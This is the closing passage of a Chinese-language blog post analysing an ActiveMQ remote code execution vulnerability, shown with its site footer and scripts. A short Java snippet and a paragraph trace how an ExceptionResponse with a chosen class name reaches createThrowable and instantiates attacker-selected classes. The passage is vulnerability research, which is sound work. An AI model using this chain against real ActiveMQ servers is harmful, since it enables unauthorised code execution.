+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="built_in">this</span>.looseUnmarshalString(dataIn);  </span><br><span class="line"><span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="built_in">this</span>.looseUnmarshalString(dataIn);  </span><br><span class="line"><span class="type">Throwable</span> <span class="variable">o</span> <span class="operator">=</span> <span class="built_in">this</span>.createThrowable(clazz, message);</span><br></pre></td></tr></table></figure>
+<p>个人分析链子的寻找应该是从createThrowable发现looseUnmarsalThrowable调用了他<br>然后发现ExceptionResponseMarshaller调用了looseUnmarsalThrowable<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405231730.png"><br>然后发现反序列化的时候，当dataType为31的时候，可以使用ExceptionResponseMarshaller<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405222336.png"><br>然后发现序列化的时候，可以修改函数，使得ExceptionResponse发送过去，ExceptionResponse需要Throwable参数，在本地修改两个class为继承Throwable是为了方便操控发送过去的classname，因为实例化rce的两个class都不是Throwable类型，调用ExceptionResponseMarshaller，达到实例化rce，</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/yezere/yezere.github.io">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99activeMQ%E9%80%9A%E4%BF%A1demo"><span class="toc-number">1.</span> <span class="toc-text">编写activeMQ通信demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&text=ActiveMQ RCE 分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&title=ActiveMQ RCE 分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&is_video=false&description=ActiveMQ RCE 分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ActiveMQ RCE 分析&body=Check out this article: http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&title=ActiveMQ RCE 分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&title=ActiveMQ RCE 分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&title=ActiveMQ RCE 分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&title=ActiveMQ RCE 分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&name=ActiveMQ RCE 分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&t=ActiveMQ RCE 分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2024
+        N1ght
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        --><!--
+          --><li><a href="/search/">搜索</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="https://github.com/yezere/yezere.github.io">项目</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?adec00eac37a4f07fb02d0f478140978";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
